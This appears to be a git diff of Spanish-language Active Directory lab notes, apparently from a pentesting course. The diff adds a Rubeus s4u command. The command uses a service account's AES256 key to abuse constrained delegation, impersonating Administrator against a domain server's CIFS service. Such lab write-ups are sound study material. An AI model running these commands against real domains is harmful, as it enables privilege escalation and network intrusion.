@@ -1260,8 +1260,10 @@ Get-DomainUser -TrustedToAuth
 ```
 
 Vemos que *websvc* tiene la delegación restringida habilitada
-Ahora usaremos este usuario para abusar de la delegación restringida solicitando un TGS para *websvc* como *Domain Admin*
-
+Ahora usaremos este usuario para abusar de la delegación restringida solicitando un TGS para *websvc* como *Domain Admin*, lo ejecutaremos desde una CMD sin *InviShell*
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
+```
 
 
 
